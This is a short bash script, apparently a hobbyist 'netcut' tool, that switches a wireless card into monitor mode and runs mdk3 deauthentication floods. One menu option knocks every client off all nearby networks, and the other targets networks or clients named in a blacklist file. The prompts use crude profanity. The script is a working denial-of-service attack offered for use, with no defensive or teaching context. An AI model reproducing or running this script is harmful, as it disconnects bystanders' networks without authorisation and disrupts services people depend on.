#!/bin/bash

echo "welcome to my netcut app"
echo "select your options to fuck off "
echo "author : K0py0r_m4mbu_s3l3t"

ifconfig wlan0 down
iwconfig wlan0 mode monitor
ifconfig wlan0 up

echo "1= fuck all network in your area"
echo "2= fuck the user in your AP"
echo "select 1 or 2 "
read pilihan
case $pilihan in
	1)
	     echo "fuck off"
	     mdk3 wlan0 d
	;;
	2)
	     echo "fuck you bitch"
	     mdk3 wlan0 d -b blacklist -m
	;;
esac
